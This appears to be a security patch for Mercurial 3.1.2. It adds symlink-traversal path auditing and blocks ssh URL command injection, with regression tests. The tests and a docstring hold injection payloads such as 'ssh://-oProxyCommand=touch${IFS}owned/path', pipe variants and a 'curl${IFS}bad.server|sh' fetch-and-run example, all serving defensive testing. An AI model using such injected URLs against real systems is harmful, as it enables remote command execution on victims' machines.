@@ -1,0 +1,813 @@
+--- mercurial-3.1.2.orig/mercurial/cmdutil.py
++++ mercurial-3.1.2/mercurial/cmdutil.py
+@@ -2479,11 +2479,11 @@ def _performrevert(repo, parents, ctx, a
+     node = ctx.node()
+     def checkout(f):
+         fc = ctx[f]
+         repo.wwrite(f, fc.data(), fc.flags())
+ 
+-    audit_path = pathutil.pathauditor(repo.root)
++    audit_path = pathutil.pathauditor(repo.root, cached=True)
+     for f in actions['remove'][0]:
+         if repo.dirstate[f] == 'a':
+             repo.dirstate.drop(f)
+             continue
+         audit_path(f)
+--- mercurial-3.1.2.orig/mercurial/dirstate.py
++++ mercurial-3.1.2/mercurial/dirstate.py
+@@ -744,11 +744,11 @@ class dirstate(object):
+             if unknown:
+                 # unknown == True means we walked all dirs under the roots
+                 # that wasn't ignored, and everything that matched was stat'ed
+                 # and is already in results.
+                 # The rest must thus be ignored or under a symlink.
+-                audit_path = pathutil.pathauditor(self._root)
++                audit_path = pathutil.pathauditor(self._root, cached=True)
+ 
+                 for nf in iter(visit):
+                     # Report ignored items in the dmap as long as they are not
+                     # under a symlink directory.
+                     if audit_path.check(nf):
+--- mercurial-3.1.2.orig/mercurial/localrepo.py
++++ mercurial-3.1.2/mercurial/localrepo.py
+@@ -196,11 +196,11 @@ class localrepository(object):
+         self.wopener = self.wvfs
+         self.root = self.wvfs.base
+         self.path = self.wvfs.join(".hg")
+         self.origroot = path
+         self.auditor = pathutil.pathauditor(self.root, self._checknested)
+-        self.vfs = scmutil.vfs(self.path)
++        self.vfs = scmutil.vfs(self.path, cacheaudited=True)
+         self.opener = self.vfs
+         self.baseui = baseui
+         self.ui = baseui.copy()
+         self.ui.copy = baseui.copy # prevent copying repo configuration
+         # A list of callback to shape the phase if no data were found.
+@@ -268,11 +268,13 @@ class localrepository(object):
+             self.sharedpath = s
+         except IOError, inst:
+             if inst.errno != errno.ENOENT:
+                 raise
+ 
+-        self.store = store.store(requirements, self.sharedpath, scmutil.vfs)
++        self.store = store.store(
++            requirements, self.sharedpath,
++            lambda base: scmutil.vfs(base, cacheaudited=True))
+         self.spath = self.store.path
+         self.svfs = self.store.vfs
+         self.sopener = self.svfs
+         self.sjoin = self.store.join
+         self.vfs.createmode = self.store.createmode
+--- mercurial-3.1.2.orig/mercurial/pathutil.py
++++ mercurial-3.1.2/mercurial/pathutil.py
+@@ -16,16 +16,21 @@ class pathauditor(object):
+     - starts at the root of a windows drive
+     - contains ".."
+     - traverses a symlink (e.g. a/symlink_here/b)
+     - inside a nested repository (a callback can be used to approve
+       some nested repositories, e.g., subrepositories)
++
++    If 'cached' is set to True, audited paths and sub-directories are cached.
++    Be careful to not keep the cache of unmanaged directories for long because
++    audited paths may be replaced with symlinks.
+     '''
+ 
+-    def __init__(self, root, callback=None):
++    def __init__(self, root, callback=None, cached=False):
+         self.audited = set()
+         self.auditeddir = set()
+         self.root = root
++        self._cached = cached
+         self.callback = callback
+         if os.path.lexists(root) and not util.checkcase(root):
+             self.normcase = util.normcase
+         else:
+             self.normcase = lambda x: x
+@@ -94,14 +99,15 @@ class pathauditor(object):
+                                          % (path, prefix))
+             prefixes.append(normprefix)
+             parts.pop()
+             normparts.pop()
+ 
+-        self.audited.add(normpath)
+-        # only add prefixes to the cache after checking everything: we don't
+-        # want to add "foo/bar/baz" before checking if there's a "foo/.hg"
+-        self.auditeddir.update(prefixes)
++        if self._cached:
++            self.audited.add(normpath)
++            # only add prefixes to the cache after checking everything: we don't
++            # want to add "foo/bar/baz" before checking if there's a "foo/.hg"
++            self.auditeddir.update(prefixes)
+ 
+     def check(self, path):
+         try:
+             self(path)
+             return True
+--- mercurial-3.1.2.orig/mercurial/posix.py
++++ mercurial-3.1.2/mercurial/posix.py
+@@ -5,10 +5,11 @@
+ # This software may be used and distributed according to the terms of the
+ # GNU General Public License version 2 or any later version.
+ 
+ from i18n import _
+ import encoding
++import error
+ import os, sys, errno, stat, getpass, pwd, grp, socket, tempfile, unicodedata
+ 
+ posixfile = open
+ normpath = os.path.normpath
+ samestat = os.path.samestat
+@@ -62,11 +63,17 @@ def parsepatchoutput(output_line):
+     return pf
+ 
+ def sshargs(sshcmd, host, user, port):
+     '''Build argument list for ssh'''
+     args = user and ("%s@%s" % (user, host)) or host
+-    return port and ("%s -p %s" % (args, port)) or args
++    if '-' in args[:1]:
++        raise error.Abort(
++            _('illegal ssh hostname or username starting with -: %s') % args)
++    args = shellquote(args)
++    if port:
++        args = '-p %s %s' % (shellquote(port), args)
++    return args
+ 
+ def isexec(f):
+     """check whether a file is executable"""
+     return (os.lstat(f).st_mode & 0100 != 0)
+ 
+--- mercurial-3.1.2.orig/mercurial/scmutil.py
++++ mercurial-3.1.2/mercurial/scmutil.py
+@@ -238,28 +238,35 @@ class abstractvfs(object):
+ class vfs(abstractvfs):
+     '''Operate files relative to a base directory
+ 
+     This class is used to hide the details of COW semantics and
+     remote file access from higher level code.
++
++    'cacheaudited' should be enabled only if (a) vfs object is short-lived, or
++    (b) the base directory is managed by hg and considered sort-of append-only.
++    See pathutil.pathauditor() for details.
+     '''
+-    def __init__(self, base, audit=True, expandpath=False, realpath=False):
++    def __init__(self, base, audit=True, cacheaudited=False, expandpath=False,
++                 realpath=False):
+         if expandpath:
+             base = util.expandpath(base)
+         if realpath:
+             base = os.path.realpath(base)
+         self.base = base
++        self._cacheaudited = cacheaudited
+         self._setmustaudit(audit)
+         self.createmode = None
+         self._trustnlink = None
+ 
+     def _getmustaudit(self):
+         return self._audit
+ 
+     def _setmustaudit(self, onoff):
+         self._audit = onoff
+         if onoff:
+-            self.audit = pathutil.pathauditor(self.base)
++            self.audit = pathutil.pathauditor(self.base,
++                                              cached=self._cacheaudited)
+         else:
+             self.audit = util.always
+ 
+     mustaudit = property(_getmustaudit, _setmustaudit)
+ 
+@@ -688,11 +695,11 @@ def _interestingfiles(repo, matcher):
+     about.
+ 
+     This is different from dirstate.status because it doesn't care about
+     whether files are modified or clean.'''
+     added, unknown, deleted, removed = [], [], [], []
+-    audit_path = pathutil.pathauditor(repo.root)
++    audit_path = pathutil.pathauditor(repo.root, cached=True)
+ 
+     ctx = repo[None]
+     dirstate = repo.dirstate
+     walkresults = dirstate.walk(matcher, sorted(ctx.substate), True, False,
+                                 full=False)
+--- mercurial-3.1.2.orig/mercurial/sshpeer.py
++++ mercurial-3.1.2/mercurial/sshpeer.py
+@@ -35,24 +35,23 @@ class sshpeer(wireproto.wirepeer):
+ 
+         u = util.url(path, parsequery=False, parsefragment=False)
+         if u.scheme != 'ssh' or not u.host or u.path is None:
+             self._abort(error.RepoError(_("couldn't parse location %s") % path))
+ 
++        util.checksafessh(path)
++
+         self.user = u.user
+         if u.passwd is not None:
+             self._abort(error.RepoError(_("password in URL not supported")))
+         self.host = u.host
+         self.port = u.port
+         self.path = u.path or "."
+ 
+         sshcmd = self.ui.config("ui", "ssh", "ssh")
+         remotecmd = self.ui.config("ui", "remotecmd", "hg")
+ 
+-        args = util.sshargs(sshcmd,
+-                            _serverquote(self.host),
+-                            _serverquote(self.user),
+-                            _serverquote(self.port))
++        args = util.sshargs(sshcmd, self.host, self.user, self.port)
+ 
+         if create:
+             cmd = '%s %s %s' % (sshcmd, args,
+                 util.shellquote("%s init %s" %
+                     (_serverquote(remotecmd), _serverquote(self.path))))
+--- mercurial-3.1.2.orig/mercurial/subrepo.py
++++ mercurial-3.1.2/mercurial/subrepo.py
+@@ -1074,10 +1074,14 @@ class svnsubrepo(abstractsubrepo):
+         if self._svnversion >= (1, 5):
+             args.append('--force')
+         # The revision must be specified at the end of the URL to properly
+         # update to a directory which has since been deleted and recreated.
+         args.append('%s@%s' % (state[0], state[1]))
++
++        # SEC: check that the ssh url is safe
++        util.checksafessh(state[0])
++
+         status, err = self._svncommand(args, failok=True)
+         _sanitize(self._ui, self._ctx._repo.wjoin(self._path), '.svn')
+         if not re.search('Checked out revision [0-9]+.', status):
+             if ('is already a working copy for a different URL' in err
+                 and (self._wcchanged()[:2] == (False, False))):
+@@ -1310,10 +1314,13 @@ class gitsubrepo(abstractsubrepo):
+         self._subsource = source
+         return _abssource(self)
+ 
+     def _fetch(self, source, revision):
+         if self._gitmissing():
++            # SEC: check for safe ssh url
++            util.checksafessh(source)
++
+             source = self._abssource(source)
+             self._ui.status(_('cloning subrepo %s from %s\n') %
+                             (self._relpath, source))
+             self._gitnodir(['clone', source, self._abspath])
+         if self._githavelocally(revision):
+--- mercurial-3.1.2.orig/mercurial/util.py
++++ mercurial-3.1.2/mercurial/util.py
+@@ -1936,10 +1936,25 @@ def hasdriveletter(path):
+     return path and path[1:2] == ':' and path[0:1].isalpha()
+ 
+ def urllocalpath(path):
+     return url(path, parsequery=False, parsefragment=False).localpath()
+ 
++def checksafessh(path):
++    """check if a path / url is a potentially unsafe ssh exploit (SEC)
++
++    This is a sanity check for ssh urls. ssh will parse the first item as
++    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
++    Let's prevent these potentially exploited urls entirely and warn the
++    user.
++
++    Raises an error.Abort when the url is unsafe.
++    """
++    path = urllib.unquote(path)
++    if path.startswith('ssh://-') or path.startswith('svn+ssh://-'):
++        raise error.Abort(_('potentially unsafe url: %r') %
++                          (path,))
++
+ def hidepassword(u):
+     '''hide user credential in a url string'''
+     u = url(u)
+     if u.passwd:
+         u.passwd = '***'
+--- mercurial-3.1.2.orig/mercurial/windows.py
++++ mercurial-3.1.2/mercurial/windows.py
+@@ -4,11 +4,11 @@
+ #
+ # This software may be used and distributed according to the terms of the
+ # GNU General Public License version 2 or any later version.
+ 
+ from i18n import _
+-import osutil, encoding
++import osutil, encoding, error
+ import errno, msvcrt, os, re, stat, sys, _winreg
+ 
+ import win32
+ executablepath = win32.executablepath
+ getuser = win32.getuser
+@@ -98,11 +98,18 @@ def parsepatchoutput(output_line):
+ 
+ def sshargs(sshcmd, host, user, port):
+     '''Build argument list for ssh or Plink'''
+     pflag = 'plink' in sshcmd.lower() and '-P' or '-p'
+     args = user and ("%s@%s" % (user, host)) or host
+-    return port and ("%s %s %s" % (args, pflag, port)) or args
++    if args.startswith('-') or args.startswith('/'):
++        raise error.Abort(
++            _('illegal ssh hostname or username starting with - or /: %s') %
++            args)
++    args = shellquote(args)
++    if port:
++        args = '%s %s %s' % (pflag, shellquote(port), args)
++    return args
+ 
+ def setflags(f, l, x):
+     pass
+ 
+ def copymode(src, dst, mode=None):
+--- mercurial-3.1.2.orig/tests/test-audit-path.t
++++ mercurial-3.1.2/tests/test-audit-path.t
+@@ -88,5 +88,104 @@ attack /tmp/test
+   $ hg update -Cr4
+   abort: path contains illegal component: /tmp/test (glob)
+   [255]
+ 
+   $ cd ..
++
++Test symlink traversal on merge:
++--------------------------------
++
++#if symlink
++
++set up symlink hell
++
++  $ mkdir merge-symlink-out
++  $ hg init merge-symlink
++  $ cd merge-symlink
++  $ touch base
++  $ hg commit -qAm base
++  $ ln -s ../merge-symlink-out a
++  $ hg commit -qAm 'symlink a -> ../merge-symlink-out'
++  $ hg up -q 0
++  $ mkdir a
++  $ touch a/poisoned
++  $ hg commit -qAm 'file a/poisoned'
++  $ hg log -G -T '{rev}: {desc}\n'
++  @  2: file a/poisoned
++  |
++  | o  1: symlink a -> ../merge-symlink-out
++  |/
++  o  0: base
++  
++
++try trivial merge
++
++  $ hg up -qC 1
++  $ hg merge 2
++  abort: path 'a/poisoned' traverses symbolic link 'a'
++  [255]
++
++try rebase onto other revision: cache of audited paths should be discarded,
++and the rebase should fail (issue5628)
++
++  $ hg up -qC 2
++  $ hg rebase -s 2 -d 1 --config extensions.rebase=
++  abort: path 'a/poisoned' traverses symbolic link 'a'
++  [255]
++  $ ls ../merge-symlink-out
++
++  $ cd ..
++
++Test symlink traversal on update:
++---------------------------------
++
++  $ mkdir update-symlink-out
++  $ hg init update-symlink
++  $ cd update-symlink
++  $ ln -s ../update-symlink-out a
++  $ hg commit -qAm 'symlink a -> ../update-symlink-out'
++  $ hg rm a
++  $ mkdir a && touch a/b
++  $ hg ci -qAm 'file a/b' a/b
++  $ hg up -qC 0
++  $ hg rm a
++  $ mkdir a && touch a/c
++  $ hg ci -qAm 'rm a, file a/c'
++  $ hg log -G -T '{rev}: {desc}\n'
++  @  2: rm a, file a/c
++  |
++  | o  1: file a/b
++  |/
++  o  0: symlink a -> ../update-symlink-out
++  
++
++try linear update where symlink already exists:
++
++  $ hg up -qC 0
++  $ hg up 1
++  abort: path 'a/b' traverses symbolic link 'a'
++  [255]
++
++try linear update including symlinked directory and its content: paths are
++audited first by calculateupdates(), where no symlink is created so both
++'a' and 'a/b' are taken as good paths. still applyupdates() should fail.
++
++  $ hg up -qC null
++  $ hg up 1
++  abort: path 'a/b' traverses symbolic link 'a'
++  [255]
++  $ ls ../update-symlink-out
++
++try branch update replacing directory with symlink, and its content: the
++path 'a' is audited as a directory first, which should be audited again as
++a symlink.
++
++  $ rm -f a
++  $ hg up -qC 2
++  $ hg up 1
++  abort: path 'a/b' traverses symbolic link 'a'
++  [255]
++  $ ls ../update-symlink-out
++
++  $ cd ..
++
++#endif
+--- mercurial-3.1.2.orig/tests/test-clone.t
++++ mercurial-3.1.2/tests/test-clone.t
+@@ -633,5 +633,68 @@ Test clone from the repository in (emula
+   0:e1bab28bca43
+   $ hg clone -U -q src dst
+   $ hg -R dst log -q
+   0:e1bab28bca43
+   $ cd ..
++
++SEC: check for unsafe ssh url
++
++  $ cat >> $HGRCPATH << EOF
++  > [ui]
++  > ssh = sh -c "read l; read l; read l"
++  > EOF
++
++  $ hg clone 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  [255]
++  $ hg clone 'ssh://%2DoProxyCommand=touch${IFS}owned/path'
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  [255]
++  $ hg clone 'ssh://fakehost|touch%20owned/path'
++  abort: no suitable response from remote hg!
++  [255]
++  $ hg clone 'ssh://fakehost%7Ctouch%20owned/path'
++  abort: no suitable response from remote hg!
++  [255]
++
++  $ hg clone 'ssh://-oProxyCommand=touch owned%20foo@example.com/nonexistent/path'
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch owned foo@example.com/nonexistent/path'
++  [255]
++
++#if windows
++  $ hg clone "ssh://%26touch%20owned%20/" --debug
++  running sh -c "read l; read l; read l" "&touch owned " "hg -R . serve --stdio"
++  sending hello command
++  sending between command
++  abort: no suitable response from remote hg!
++  [255]
++  $ hg clone "ssh://example.com:%26touch%20owned%20/" --debug
++  running sh -c "read l; read l; read l" -p "&touch owned " example.com "hg -R . serve --stdio"
++  sending hello command
++  sending between command
++  abort: no suitable response from remote hg!
++  [255]
++#else
++  $ hg clone "ssh://%3btouch%20owned%20/" --debug
++  running sh -c "read l; read l; read l" ';touch owned ' 'hg -R . serve --stdio'
++  sending hello command
++  sending between command
++  abort: no suitable response from remote hg!
++  [255]
++  $ hg clone "ssh://example.com:%3btouch%20owned%20/" --debug
++  running sh -c "read l; read l; read l" -p ';touch owned ' 'example.com' 'hg -R . serve --stdio'
++  sending hello command
++  sending between command
++  abort: no suitable response from remote hg!
++  [255]
++#endif
++
++  $ hg clone "ssh://v-alid.example.com/" --debug
++  running sh -c "read l; read l; read l" 'v-alid\.example\.com' ['"]hg -R \. serve --stdio['"] (re)
++  sending hello command
++  sending between command
++  abort: no suitable response from remote hg!
++  [255]
++
++We should not have created a file named owned - if it exists, the
++attack succeeded.
++  $ if test -f owned; then echo 'you got owned'; fi
+--- mercurial-3.1.2.orig/tests/test-commandserver.py
++++ mercurial-3.1.2/tests/test-commandserver.py
+@@ -302,10 +302,38 @@ def getpass(server):
+ def startwithoutrepo(server):
+     readchannel(server)
+     runcommand(server, ['init', 'repo2'])
+     runcommand(server, ['id', '-R', 'repo2'])
+ 
++def traversalsetup(server):
++    readchannel(server)
++
++    # set up symlink hell
++    f = open('base', 'ab')
++    f.close()
++    runcommand(server, ['commit', '-qAm', 'base'])
++    os.symlink('../merge-symlink-out', 'a')
++    runcommand(server, ['commit', '-qAm', 'symlink a -> ../merge-symlink-out'])
++    runcommand(server, ['up', '-q', '0'])
++    os.mkdir('a')
++    f = open('a/poisoned', 'ab')
++    f.close()
++    runcommand(server, ['commit', '-qAm', 'file a/poisoned'])
++    runcommand(server, ['log', '-G', '-T', '{rev}: {desc}\n'])
++
++def traversalmerge(server):
++    # try trivial merge after update: cache of audited paths should be
++    # discarded, and the merge should fail (issue5628)
++    readchannel(server)
++    runcommand(server, ['up', '-q', 'null'])
++    # audit a/poisoned as a good path
++    runcommand(server, ['up', '-qC', '2'])
++    runcommand(server, ['up', '-qC', '1'])
++    # here a is a symlink, so a/poisoned is bad
++    runcommand(server, ['merge', '2'])
++    os.system('ls ../merge-symlink-out')
++
+ if __name__ == '__main__':
+     os.system('hg init repo')
+     os.chdir('repo')
+ 
+     check(hellomessage)
+@@ -353,5 +381,12 @@ if __name__ == '__main__':
+     check(getpass)
+ 
+     os.chdir('..')
+     check(hellomessage)
+     check(startwithoutrepo)
++
++    os.mkdir('merge-symlink-out')
++    os.system('hg init merge-symlink')
++    os.chdir('merge-symlink')
++    check(traversalsetup)
++    check(traversalmerge)
++    os.chdir('..')
+--- mercurial-3.1.2.orig/tests/test-commandserver.py.out
++++ mercurial-3.1.2/tests/test-commandserver.py.out
+@@ -258,5 +258,29 @@ abort: there is no Mercurial repository
+ testing startwithoutrepo:
+ 
+  runcommand init repo2
+  runcommand id -R repo2
+ 000000000000 tip
++
++testing traversalsetup:
++
++ runcommand commit -qAm base
++ runcommand commit -qAm symlink a -> ../merge-symlink-out
++ runcommand up -q 0
++ runcommand commit -qAm file a/poisoned
++ runcommand log -G -T {rev}: {desc}
++
++@  2: file a/poisoned
++|
++| o  1: symlink a -> ../merge-symlink-out
++|/
++o  0: base
++
++
++testing traversalmerge:
++
++ runcommand up -q null
++ runcommand up -qC 2
++ runcommand up -qC 1
++ runcommand merge 2
++abort: path 'a/poisoned' traverses symbolic link 'a'
++ [255]
+--- mercurial-3.1.2.orig/tests/test-pull.t
++++ mercurial-3.1.2/tests/test-pull.t
+@@ -87,6 +87,28 @@ regular shell commands.
+   [255]
+ 
+   $ URL=`python -c "import os; print 'file://localhost' + ('/' + os.getcwd().replace(os.sep, '/')).replace('//', '/') + '/../test'"`
+   $ hg pull -q "$URL"
+ 
++SEC: check for unsafe ssh url
++
++  $ cat >> $HGRCPATH << EOF
++  > [ui]
++  > ssh = sh -c "read l; read l; read l"
++  > EOF
++
++  $ hg pull 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  [255]
++  $ hg pull 'ssh://%2DoProxyCommand=touch${IFS}owned/path'
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  [255]
++  $ hg pull 'ssh://fakehost|touch${IFS}owned/path'
++  abort: no suitable response from remote hg!
++  [255]
++  $ hg pull 'ssh://fakehost%7Ctouch%20owned/path'
++  abort: no suitable response from remote hg!
++  [255]
++
++  $ [ ! -f owned ] || echo 'you got owned'
++
+   $ cd ..
+--- mercurial-3.1.2.orig/tests/test-push-r.t
++++ mercurial-3.1.2/tests/test-push-r.t
+@@ -145,5 +145,31 @@
+   crosschecking files in changesets and manifests
+   checking files
+   4 files, 9 changesets, 7 total revisions
+ 
+   $ cd ..
++
++SEC: check for unsafe ssh url
++
++  $ cat >> $HGRCPATH << EOF
++  > [ui]
++  > ssh = sh -c "read l; read l; read l"
++  > EOF
++
++  $ hg -R test push 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  pushing to ssh://-oProxyCommand%3Dtouch%24%7BIFS%7Downed/path
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  [255]
++  $ hg -R test push 'ssh://%2DoProxyCommand=touch${IFS}owned/path'
++  pushing to ssh://-oProxyCommand%3Dtouch%24%7BIFS%7Downed/path
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path'
++  [255]
++  $ hg -R test push 'ssh://fakehost|touch${IFS}owned/path'
++  pushing to ssh://fakehost%7Ctouch%24%7BIFS%7Downed/path
++  abort: no suitable response from remote hg!
++  [255]
++  $ hg -R test push 'ssh://fakehost%7Ctouch%20owned/path'
++  pushing to ssh://fakehost%7Ctouch%20owned/path
++  abort: no suitable response from remote hg!
++  [255]
++
++  $ [ ! -f owned ] || echo 'you got owned'
+--- mercurial-3.1.2.orig/tests/test-subrepo-git.t
++++ mercurial-3.1.2/tests/test-subrepo-git.t
+@@ -692,5 +692,36 @@ whitelisting of ext should be respected
+   and the repository exists.
+   updating to branch default
+   cloning subrepo s from ext::sh -c echo% pwned% >&2
+   abort: git clone error 128 in s (in subrepo s)
+   [255]
++
++test for ssh exploit with git subrepos 2017-07-25
++
++  $ hg init malicious-proxycommand
++  $ cd malicious-proxycommand
++  $ echo 's = [git]ssh://-oProxyCommand=rm${IFS}non-existent/path' > .hgsub
++  $ git init s
++  Initialized empty Git repository in $TESTTMP/tc/malicious-proxycommand/s/.git/
++  $ cd s
++  $ git commit --allow-empty -m 'empty'
++  [master (root-commit) 153f934] empty
++  $ cd ..
++  $ hg add .hgsub
++  $ hg ci -m 'add subrepo'
++  $ cd ..
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=rm${IFS}non-existent/path' (in subrepo s)
++  [255]
++
++also check that a percent encoded '-' (%2D) doesn't work
++
++  $ cd malicious-proxycommand
++  $ echo 's = [git]ssh://%2DoProxyCommand=rm${IFS}non-existent/path' > .hgsub
++  $ hg ci -m 'change url to percent encoded'
++  $ cd ..
++  $ rm -r malicious-proxycommand-clone
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=rm${IFS}non-existent/path' (in subrepo s)
++  [255]
+--- mercurial-3.1.2.orig/tests/test-subrepo-svn.t
++++ mercurial-3.1.2/tests/test-subrepo-svn.t
+@@ -682,5 +682,45 @@ Test that sanitizing is omitted in meta
+   $ mkdir s/.svn/.hg
+   $ echo '.hg/hgrc in svn metadata area' > s/.svn/.hg/hgrc
+   $ hg update -q -C '.^1'
+ 
+   $ cd ../..
++
++SEC: test for ssh exploit
++
++  $ hg init ssh-vuln
++  $ cd ssh-vuln
++  $ echo "s = [svn]$SVNREPOURL/src" >> .hgsub
++  $ svn co --quiet "$SVNREPOURL"/src s
++  $ hg add .hgsub
++  $ hg ci -m1
++  $ echo "s = [svn]svn+ssh://-oProxyCommand=touch%20owned%20nested" > .hgsub
++  $ hg ci -m2
++  $ cd ..
++  $ hg clone ssh-vuln ssh-vuln-clone
++  updating to branch default
++  abort: potentially unsafe url: 'svn+ssh://-oProxyCommand=touch owned nested' (in subrepo s)
++  [255]
++
++also check that a percent encoded '-' (%2D) doesn't work
++
++  $ cd ssh-vuln
++  $ echo "s = [svn]svn+ssh://%2DoProxyCommand=touch%20owned%20nested" > .hgsub
++  $ hg ci -m3
++  $ cd ..
++  $ rm -r ssh-vuln-clone
++  $ hg clone ssh-vuln ssh-vuln-clone
++  updating to branch default
++  abort: potentially unsafe url: 'svn+ssh://-oProxyCommand=touch owned nested' (in subrepo s)
++  [255]
++
++also check that hiding the attack in the username doesn't work:
++
++  $ cd ssh-vuln
++  $ echo "s = [svn]svn+ssh://%2DoProxyCommand=touch%20owned%20foo@example.com/nested" > .hgsub
++  $ hg ci -m3
++  $ cd ..
++  $ rm -r ssh-vuln-clone
++  $ hg clone ssh-vuln ssh-vuln-clone
++  updating to branch default
++  abort: potentially unsafe url: 'svn+ssh://-oProxyCommand=touch owned foo@example.com/nested' (in subrepo s)
++  [255]
+--- mercurial-3.1.2.orig/tests/test-subrepo.t
++++ mercurial-3.1.2/tests/test-subrepo.t
+@@ -1472,5 +1472,79 @@ Test that '[paths]' is configured correc
+   $ cat t/.hg/hgrc
+   [paths]
+   default = $TESTTMP/t/t
+   default-push = /foo/bar/t
+   $ cd ..
++
++test for ssh exploit 2017-07-25
++
++  $ cat >> $HGRCPATH << EOF
++  > [ui]
++  > ssh = sh -c "read l; read l; read l"
++  > EOF
++
++  $ hg init malicious-proxycommand
++  $ cd malicious-proxycommand
++  $ echo 's = [hg]ssh://-oProxyCommand=touch${IFS}owned/path' > .hgsub
++  $ hg init s
++  $ cd s
++  $ echo init > init
++  $ hg add
++  adding init
++  $ hg commit -m init
++  $ cd ..
++  $ hg add .hgsub
++  $ hg ci -m 'add subrepo'
++  $ cd ..
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path' (in subrepo s)
++  [255]
++
++also check that a percent encoded '-' (%2D) doesn't work
++
++  $ cd malicious-proxycommand
++  $ echo 's = [hg]ssh://%2DoProxyCommand=touch${IFS}owned/path' > .hgsub
++  $ hg ci -m 'change url to percent encoded'
++  $ cd ..
++  $ rm -r malicious-proxycommand-clone
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch${IFS}owned/path' (in subrepo s)
++  [255]
++
++also check for a pipe
++
++  $ cd malicious-proxycommand
++  $ echo 's = [hg]ssh://fakehost|touch${IFS}owned/path' > .hgsub
++  $ hg ci -m 'change url to pipe'
++  $ cd ..
++  $ rm -r malicious-proxycommand-clone
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: no suitable response from remote hg!
++  [255]
++  $ [ ! -f owned ] || echo 'you got owned'
++
++also check that a percent encoded '|' (%7C) doesn't work
++
++  $ cd malicious-proxycommand
++  $ echo 's = [hg]ssh://fakehost%7Ctouch%20owned/path' > .hgsub
++  $ hg ci -m 'change url to percent encoded pipe'
++  $ cd ..
++  $ rm -r malicious-proxycommand-clone
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: no suitable response from remote hg!
++  [255]
++  $ [ ! -f owned ] || echo 'you got owned'
++
++and bad usernames:
++  $ cd malicious-proxycommand
++  $ echo 's = [hg]ssh://-oProxyCommand=touch owned@example.com/path' > .hgsub
++  $ hg ci -m 'owned username'
++  $ cd ..
++  $ rm -r malicious-proxycommand-clone
++  $ hg clone malicious-proxycommand malicious-proxycommand-clone
++  updating to branch default
++  abort: potentially unsafe url: 'ssh://-oProxyCommand=touch owned@example.com/path' (in subrepo s)
++  [255]
